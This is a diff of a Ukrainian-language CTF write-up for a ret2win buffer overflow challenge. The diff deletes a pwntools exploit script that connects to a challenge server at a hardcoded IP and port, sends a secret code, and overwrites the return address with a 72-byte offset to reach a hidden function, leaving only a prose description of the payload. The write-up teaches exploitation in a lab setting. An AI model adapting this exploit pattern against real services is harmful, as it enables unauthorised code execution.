@@ -151,23 +151,8 @@ Breakpoint 1, 0x000000000040181b in main ()
 
 Маємо звичайний Ret2win через Buffer Overflow.
 
-Наш payload має складатись з: offset (64 + 8 bytes) -> nowhere address
-```py
-from pwn import *
+Наш payload має складатись з: ***offset (64 + 8 bytes) -> nowhere address***
 
-#p = process('./The_Crypt')
-p = remote("159.65.228.107", 5001)
-
-p.sendlineafter(b'(Secret Code Required): ', b'Open_The_Door_To_Nowhere')
-
-offset = 0x40 + 0x8
-nowhere_addr = 0x401660
-
-payload = b'g'*offset + p64(nowhere_addr)
-p.sendlineafter(b'FORGOTTEN REALM?!":', payload)
-
-p.interactive()
-```
 Отримуємо прапор:
 ```sh
 $ python payload.py
